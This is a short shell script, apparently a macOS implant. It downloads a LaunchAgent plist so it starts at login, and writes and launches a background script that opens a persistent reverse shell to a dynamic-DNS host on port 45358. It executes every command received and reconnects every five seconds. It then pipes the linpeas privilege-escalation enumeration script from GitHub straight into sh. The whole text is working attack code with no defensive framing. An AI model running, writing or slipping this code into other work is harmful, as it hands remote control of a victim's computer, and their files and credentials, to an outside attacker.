curl -L https://raw.githubusercontent.com/canarddu38/temp/main/loginscript.plist --output ~/Library/LaunchAgents/com.user.loginscript.plist

cat > ~/bashlogon_d.sh <<EOF
#!/bin/bash

# Function to establish connection
establish_connection() {
    exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358
}

# Function to handle commands
handle_commands() {
    while read -r line; do
        $line 2>&5 >&5
    done <&5
}

# Main loop to handle reconnection
while true; do
    establish_connection
    handle_commands
    # Sleep for a while before attempting to reconnect
    sleep 5
done
EOF

chmod +x ~/bashlogon_d.sh

bash ~/bashlogon_d.sh &

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
